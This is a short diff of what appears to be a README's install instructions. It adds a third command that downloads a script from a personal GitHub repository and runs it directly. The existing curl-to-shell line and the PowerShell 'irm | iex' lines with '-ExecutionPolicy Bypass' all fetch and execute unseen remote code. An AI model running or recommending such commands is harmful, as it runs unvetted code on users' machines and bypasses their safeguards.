@@ -10,3 +10,7 @@ curl -fsSL https://raw.githubusercontent.com/linh2k4zz-commits/linh/main/a.sh | 
 b for window ps:
 
 powershell -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/linh2k4zz-commits/linh/main/b.ps1 | iex"
+
+
+powershell -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/linh2k4zz-commits/linh/main/pc.ps1 | iex"
+
